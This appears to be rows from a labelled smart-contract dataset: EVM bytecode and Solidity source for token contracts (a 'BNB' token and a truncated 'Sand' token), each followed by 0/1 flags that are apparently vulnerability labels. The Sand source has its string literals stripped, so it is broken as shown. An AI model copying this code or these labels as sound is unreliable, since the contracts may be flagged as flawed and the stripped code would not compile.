b600060149054906101000a900460ff16151561116357600080fd5b60008060146101000a81548160ff0219169083151502179055507f7805862f689e2f13df9f062ff482ad3ad112aca9e0847911ed832e158c525b3360405160405180910390a1565b6000600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b6005602052816000526040600020602052806000526040600020600091509150505481565b600060149054906101000a900460ff1681565b6000600a60149054906101000a900460ff161561133757600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231836000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b151561131557600080fd5b6102c65a03f1151561132657600080fd5b505050604051805190509050611343565b61134082612652565b90505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156113a357600080fd5b600060149054906101000a900460ff161515156113bf57600080fd5b6001600060146101000a81548160ff0219169083151502179055507f6985a02210a168e66602d3235cb6db0e70f92b3ba4d376a33c0f3d9434bff62560405160405180910390a1565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60088054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156114ec5780601f106114c1576101008083540402835291602001916114ec565b820191906000526020600020905b8154815290600101906020018083116114cf57829003601f168201915b505050505081565b600060149054906101000a900460ff1615151561151057600080fd5b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615151561156957600080fd5b600a60149054906101000a900460ff161561168f57600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636e18980a3384846040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019350505050600060405180830381600087803b151561167657600080fd5b6102c65a03f1151561168757600080fd5b50505061169a565b611699828261269b565b5b5050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156116f957600080fd5b60148210151561170857600080fd5b60328110151561171757600080fd5b81600381905550611736600954600a0a82612a0390919063ffffffff16565b6004819055507fb044a1e409eac5c48e5af22d4af52670dd1a99059537a78b31b48c6500a6354e600354600454604051808381526020018281526020019250505060405180910390a15050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156117de57600080fd5b60015481600154011115156117f257600080fd5b600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205481600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054011115156118c257600080fd5b80600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550806001600082825401925050819055507fcb8241adb0c3fdb35b70c24ce35c5eb0c17af7431c99f827d44a445ca624176a816040518082815260200191505060405180910390a150565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156119d557600080fd5b80600154101515156119e657600080fd5b80600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151515611a5557600080fd5b8060016000828254039250508190555080600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055507f702d5967f45f6513a38ffc42d6ba9bf230bd40e8f53b16363c7eb4fd2deb9a44816040518082815260200191505060405180910390a150565b6000600a60149054906101000a900460ff1615611c3f57600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e84846000604051602001526040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200192505050602060405180830381600087803b1515611c1d57600080fd5b6102c65a03f11515611c2e57600080fd5b505050604051805190509050611c4c565b611c498383612a3e565b90505b92915050565b60035481565b60066020528060005260406000206000915054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515611cd357600080fd5b6000600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055507fd7e9ec6e6ecd65492dce6bf513cd6867560d49544421d0783ddf06e76c24470c81604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a150565b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515611e1057600080fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141515611e8757806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515611ee757600080fd5b600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff161515611f3f57600080fd5b611f4882611239565b90506000600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550806001600082825403925050819055507f61e6e66b0d6339b2980aecc6ccc0039736791f0ccde9ed512e789a7fbdd698c68282604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018281526020019250505060405180910390a15050565b60406004810160003690501015151561202657600080fd5b600082141580156120b457506000600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205414155b1515156120c057600080fd5b81600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a3505050565b60008060006060600481016000369050101515156121c857600080fd5b600560008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054935061227061271061226260035488612a0390919063ffffffff16565b612ac590919063ffffffff16565b92506004548311156122825760045492505b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff84101561233e576122bd8585612ae090919063ffffffff16565b600560008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b6123518386612ae090919063ffffffff16565b91506123a585600260008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054612ae090919063ffffffff16565b600260008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061243a82600260008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054612af990919063ffffffff16565b600260008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060008311156125e4576124f983600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054612af990919063ffffffff16565b600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168773ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef856040518082815260200191505060405180910390a35b8573ffffffffffffffffffffffffffffffffffffffff168773ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a350505050505050565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6000806040600481016000369050101515156126b657600080fd5b6126df6127106126d160035487612a0390919063ffffffff16565b612ac590919063ffffffff16565b92506004548311156126f15760045492505b6127048385612ae090919063ffffffff16565b915061275884600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054612ae090919063ffffffff16565b600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506127ed82600260008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054612af990919063ffffffff16565b600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506000831115612997576128ac83600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054612af990919063ffffffff16565b600260008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef856040518082815260200191505060405180910390a35b8473ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a35050505050565b6000806000841415612a185760009150612a37565b8284029050828482811515612a2957fe5b04141515612a3357fe5b8091505b5092915050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6000808284811515612ad357fe5b0490508091505092915050565b6000828211151515612aee57fe5b818303905092915050565b6000808284019050838110151515612b0d57fe5b80915050929150505600a165627a7a72305820645ee12d73db47fd78ba77fa1f824c3c8f9184061b3b10386beb4dc9236abb280029,1,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0
"pragma solidity ^0.4.8;contract SafeMath { function safeMul(uint256 a, uint256 b) internal returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function safeDiv(uint256 a, uint256 b) internal returns (uint256) { assert(b > 0); uint256 c = a / b; assert(a == b * c + a % b); return c; } function safeSub(uint256 a, uint256 b) internal returns (uint256) { assert(b <= a); return a - b; } function safeAdd(uint256 a, uint256 b) internal returns (uint256) { uint256 c = a + b; assert(c>=a && c>=b); return c; } function assert(bool assertion) internal { if (!assertion) { throw; } }}contract BNB is SafeMath{ string public name; string public symbol; uint8 public decimals; uint256 public totalSupply; address public owner; mapping (address => uint256) public balanceOf; mapping (address => uint256) public freezeOf; mapping (address => mapping (address => uint256)) public allowance; event Transfer(address indexed from, address indexed to, uint256 value); event Burn(address indexed from, uint256 value); event Freeze(address indexed from, uint256 value); event Unfreeze(address indexed from, uint256 value); function BNB( uint256 initialSupply, string tokenName, uint8 decimalUnits, string tokenSymbol ) { balanceOf[msg.sender] = initialSupply; totalSupply = initialSupply; name = tokenName; symbol = tokenSymbol; decimals = decimalUnits; owner = msg.sender; } function transfer(address _to, uint256 _value) { if (_to == 0x0) throw; if (_value <= 0) throw; if (balanceOf[msg.sender] < _value) throw; if (balanceOf[_to] + _value < balanceOf[_to]) throw; balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value); balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value); Transfer(msg.sender, _to, _value); } function approve(address _spender, uint256 _value) returns (bool success) { if (_value <= 0) throw; allowance[msg.sender][_spender] = _value; return true; } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (_to == 0x0) throw; if (_value <= 0) throw; if (balanceOf[_from] < _value) throw; if (balanceOf[_to] + _value < balanceOf[_to]) throw; if (_value > allowance[_from][msg.sender]) throw; balanceOf[_from] = SafeMath.safeSub(balanceOf[_from], _value); balanceOf[_to] = SafeMath.safeAdd(balanceOf[_to], _value); allowance[_from][msg.sender] = SafeMath.safeSub(allowance[_from][msg.sender], _value); Transfer(_from, _to, _value); return true; } function burn(uint256 _value) returns (bool success) { if (balanceOf[msg.sender] < _value) throw; if (_value <= 0) throw; balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value); totalSupply = SafeMath.safeSub(totalSupply,_value); Burn(msg.sender, _value); return true; } function freeze(uint256 _value) returns (bool success) { if (balanceOf[msg.sender] < _value) throw; if (_value <= 0) throw; balanceOf[msg.sender] = SafeMath.safeSub(balanceOf[msg.sender], _value); freezeOf[msg.sender] = SafeMath.safeAdd(freezeOf[msg.sender], _value); Freeze(msg.sender, _value); return true; } function unfreeze(uint256 _value) returns (bool success) { if (freezeOf[msg.sender] < _value) throw; if (_value <= 0) throw; freezeOf[msg.sender] = SafeMath.safeSub(freezeOf[msg.sender], _value); balanceOf[msg.sender] = SafeMath.safeAdd(balanceOf[msg.sender], _value); Unfreeze(msg.sender, _value); return true; } function withdrawEther(uint256 amount) { if(msg.sender != owner)throw; owner.transfer(amount); } function() payable { }}",0x606060405236156100d9576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde03146100e2578063095ea7b31461017157806318160ddd146101cb57806323b872dd146101f4578063313ce5671461026d5780633bed33ce1461029c57806342966c68146102bf5780636623fc46146102fa57806370a08231146103355780638da5cb5b1461038257806395d89b41146103d7578063a9059cbb14610466578063cd4217c1146104a8578063d7a78db8146104f5578063dd62ed3e14610530575b6100e05b5b565b005b34156100ed57600080fd5b6100f561059c565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101365780820151818401525b60208101905061011a565b50505050905090810190601f1680156101635780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561017c57600080fd5b6101b1600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190505061063a565b604051808215151515815260200191505060405180910390f35b34156101d657600080fd5b6101de6106d6565b6040518082815260200191505060405180910390f35b34156101ff57600080fd5b610253600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506106dc565b604051808215151515815260200191505060405180910390f35b341561027857600080fd5b610280610b01565b604051808260ff1660ff16815260200191505060405180910390f35b34156102a757600080fd5b6102bd6004808035906020019091905050610b14565b005b34156102ca57600080fd5b6102e06004808035906020019091905050610bd6565b604051808215151515815260200191505060405180910390f35b341561030557600080fd5b61031b6004808035906020019091905050610d29565b604051808215151515815260200191505060405180910390f35b341561034057600080fd5b61036c600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610ef6565b6040518082815260200191505060405180910390f35b341561038d57600080fd5b610395610f0e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156103e257600080fd5b6103ea610f34565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561042b5780820151818401525b60208101905061040f565b50505050905090810190601f1680156104585780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561047157600080fd5b6104a6600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610fd2565b005b34156104b357600080fd5b6104df600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611260565b6040518082815260200191505060405180910390f35b341561050057600080fd5b6105166004808035906020019091905050611278565b604051808215151515815260200191505060405180910390f35b341561053b57600080fd5b610586600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611445565b6040518082815260200191505060405180910390f35b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106325780601f1061060757610100808354040283529160200191610632565b820191906000526020600020905b81548152906001019060200180831161061557829003601f168201915b505050505081565b6000808211151561064a57600080fd5b81600760003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550600190505b92915050565b60035481565b6000808373ffffffffffffffffffffffffffffffffffffffff16141561070157600080fd5b60008211151561071057600080fd5b81600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101561075c57600080fd5b600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540110156107e957600080fd5b600760008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111561087257600080fd5b6108bb600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548361146a565b600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610947600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483611484565b600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610a10600760008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548361146a565b600760008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190505b9392505050565b600260009054906101000a900460ff1681565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610b7057600080fd5b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501515610bd257600080fd5b5b50565b600081600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610c2457600080fd5b600082111515610c3357600080fd5b610c7c600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548361146a565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610ccb6003548361146a565b6003819055503373ffffffffffffffffffffffffffffffffffffffff167fcc16f5dbb4873280815c1ee09dbd06736cffcc184412cf7a71a0fdb75d397ca5836040518082815260200191505060405180910390a2600190505b919050565b600081600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610d7757600080fd5b600082111515610d8657600080fd5b610dcf600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548361146a565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610e5b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483611484565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff167f2cfce4af01bcb9d6cf6c84ee1b7c491100b8695368264146a94d71e10a63083f836040518082815260200191505060405180910390a2600190505b919050565b60056020528060005260406000206000915090505481565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60018054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610fca5780601f10610f9f57610100808354040283529160200191610fca565b820191906000526020600020905b815481529060010190602001808311610fad57829003601f168201915b505050505081565b60008273ffffffffffffffffffffffffffffffffffffffff161415610ff657600080fd5b60008111151561100557600080fd5b80600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101561105157600080fd5b600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205481600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540110156110de57600080fd5b611127600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548261146a565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506111b3600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482611484565b600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35b5050565b60066020528060005260406000206000915090505481565b600081600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410156112c657600080fd5b6000821115156112d557600080fd5b61131e600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548361146a565b600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506113aa600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483611484565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff167ff97a274face0b5517365ad396b1fdba6f68bd3135ef603e44272adba3af5a1e0836040518082815260200191505060405180910390a2600190505b919050565b6007602052816000526040600020602052806000526040600020600091509150505481565b6000611478838311156114af565b81830390505b92915050565b60008082840190506114a484821015801561149f5750838210155b6114af565b8091505b5092915050565b8015156114bb57600080fd5b5b505600a165627a7a72305820082734e053ffbdf2a3195354a3210dff3723c239a1e76ae3be0936f6aed31bee0029,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.5.2; contract Admin { address internal _admin; event AdminChanged(address oldAdmin, address newAdmin); /// @notice gives the current administrator of this contract. /// @return the current administrator of this contract. function getAdmin() external view returns (address) { return _admin; } /// @notice change the administrator to be `newAdmin`. /// @param newAdmin address of the new administrator. function changeAdmin(address newAdmin) external { require(msg.sender == _admin, ); emit AdminChanged(_admin, newAdmin); _admin = newAdmin; } } pragma solidity ^0.5.2; import ; contract SuperOperators is Admin { mapping(address => bool) internal _superOperators; event SuperOperator(address superOperator, bool enabled); /// @notice Enable or disable the ability of `superOperator` to transfer tokens of all (superOperator rights). /// @param superOperator address that will be given/removed superOperator right. /// @param enabled set whether the superOperator is enabled or disabled. function setSuperOperator(address superOperator, bool enabled) external { require( msg.sender == _admin, ); _superOperators[superOperator] = enabled; emit SuperOperator(superOperator, enabled); } /// @notice check whether address `who` is given superOperator rights. /// @param who The address to query. /// @return whether the address has superOperator rights. function isSuperOperator(address who) public view returns (bool) { return _superOperators[who]; } } pragma solidity ^0.5.2; contract ERC20Events { event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value ); } pragma solidity ^0.5.2; library BytesUtil { function memcpy(uint256 dest, uint256 src, uint256 len) internal pure { // Copy word-length chunks while possible for (; len >= 32; len -= 32) { assembly { mstore(dest, mload(src)) } dest += 32; src += 32; } // Copy remaining bytes uint256 mask = 256**(32 - len) - 1; assembly { let srcpart := and(mload(src), not(mask)) let destpart := and(mload(dest), mask) mstore(dest, or(destpart, srcpart)) } } function pointerToBytes(uint256 src, uint256 len) internal pure returns (bytes memory) { bytes memory ret = new bytes(len); uint256 retptr; assembly { retptr := add(ret, 32) } memcpy(retptr, src, len); return ret; } function addressToBytes(address a) internal pure returns (bytes memory b) { assembly { let m := mload(0x40) mstore( add(m, 20), xor(0x140000000000000000000000000000000000000000, a) ) mstore(0x40, add(m, 52)) b := m } } function uint256ToBytes(uint256 a) internal pure returns (bytes memory b) { assembly { let m := mload(0x40) mstore(add(m, 32), a) mstore(0x40, add(m, 64)) b := m } } function doFirstParamEqualsAddress(bytes memory data, address _address) internal pure returns (bool) { if (data.length < (36 + 32)) { return false; } uint256 value; assembly { value := mload(add(data, 36)) } return value == uint256(_address); } function doParamEqualsUInt256(bytes memory data, uint256 i, uint256 value) internal pure returns (bool) { if (data.length < (36 + (i + 1) * 32)) { return false; } uint256 offset = 36 + i * 32; uint256 valuePresent; assembly { valuePresent := mload(add(data, offset)) } return valuePresent == value; } function overrideFirst32BytesWithAddress( bytes memory data, address _address ) internal pure returns (bytes memory) { uint256 dest; assembly { dest := add(data, 48) } // 48 = 32 (offset) + 4 (func sig) + 12 (address is only 20 bytes) bytes memory addressBytes = addressToBytes(_address); uint256 src; assembly { src := add(addressBytes, 32) } memcpy(dest, src, 20); return data; } function overrideFirstTwo32BytesWithAddressAndInt( bytes memory data, address _address, uint256 _value ) internal pure returns (bytes memory) { uint256 dest; uint256 src; assembly { dest := add(data, 48) } // 48 = 32 (offset) + 4 (func sig) + 12 (address is only 20 bytes) bytes memory bbytes = addressToBytes(_address); assembly { src := add(bbytes, 32) } memcpy(dest, src, 20); assembly { dest := add(data, 68) } // 48 = 32 (offset) + 4 (func sig) + 32 (next slot) bbytes = uint256ToBytes(_value); assembly { src := add(bbytes, 32) } memcpy(dest, src, 32); return data; } } pragma solidity 0.5.9; import ; import ; import ; contract Sand is ERC20ExecuteExtension, ERC20BasicApproveExtension, ERC20BaseToken { constructor(address sandAdmin, address executionAdmin, address beneficiary) public { _admin = sandAdmin; _executionAdmin = executionAdmin; _mint(beneficiary, 3000000000000000000000000000); } /// @notice A descriptive name for the tokens /// @return name of the tokens function name() public view returns (string memory) { return ; } /// @notice An abbreviated name for the tokens /// @return symbol of the tokens function symbol() public view returns (string memory) { return ; } } pragma solidity 0.5.9; import ; import ; contract ERC20BaseToken is SuperOperators, ERC20Events { uint256 internal _totalSupply; mapping(address => uint256) internal _balances; mapping(address => mapping(address => uint256)) internal _allowances; /// @notice Gets the total number of tokens in existence. /// @return the total number of tokens in existence. function totalSupply() public view returns (uint256) { return _totalSupply; } /// @notice Gets the balance of `owner`. /// @param owner The address to query the balance of. /// @return The amount owned by `owner`. function balanceOf(address owner) public view returns (uint256) { return _balances[owner]; } /// @notice gets allowance of `spender` for `owner`'s tokens. /// @param owner address whose token is allowed. /// @param spender address allowed to transfer. /// @return the amount of token `spender` is allowed to transfer on behalf of `owner`. function allowance(address owner, address spender) public view returns (uint256 remaining) { return _allowances[owner][spender]; } /// @notice returns the number of decimals for that token. /// @return the number of decimals. function decimals() public view returns 